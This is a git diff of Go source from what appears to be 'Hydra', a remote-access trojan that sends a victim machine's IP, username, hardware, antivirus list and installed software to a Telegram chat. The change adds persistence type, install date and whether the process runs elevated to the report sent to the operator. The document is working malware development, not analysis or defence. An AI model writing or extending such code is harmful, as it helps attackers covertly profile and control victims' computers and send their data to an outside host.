@@ -8,6 +8,7 @@ import (
 	"os/user"
 	"runtime"
 	"strings"
+	"time"
 
 	"github.com/Raffy27/Hydra/api"
 	"github.com/Raffy27/Hydra/install"
@@ -19,7 +20,7 @@ const (
 	fmtInfo = "```\nIP Address: %s\nComputer name: %s\nUsername: [%s] %s\nOperating System: %s %s\n" +
 		"CPU: %s\nGPU: %s\nMemory: %s\nAV:\n    %s\n```"
 	softInfo = "```\nInstalled Software:\n    %s```"
-	fmtInst  = "```\nHydra v2.1\n%v\n```"
+	fmtInst  = "```\nHydra v2.1\nIIF Loaded: %v\nBase: %s\nInstall Date: %s\nPersistence: %d\nElevated: %v\n```"
 )
 
 func Info() {
@@ -54,7 +55,13 @@ func Software() {
 
 func InstanceInfo() {
 	cfg := tgbotapi.NewMessage(util.ChatID,
-		fmt.Sprintf(fmtInst, install.Info),
+		fmt.Sprintf(fmtInst,
+			install.Info.Loaded,
+			install.Info.Base,
+			strings.Replace(install.Info.Date.Format(time.RFC3339), "T", " ", 1),
+			install.Info.PType,
+			util.RunningAsAdmin(),
+		),
 	)
 	cfg.ParseMode = "Markdown"
 	api.Bot.Send(cfg)
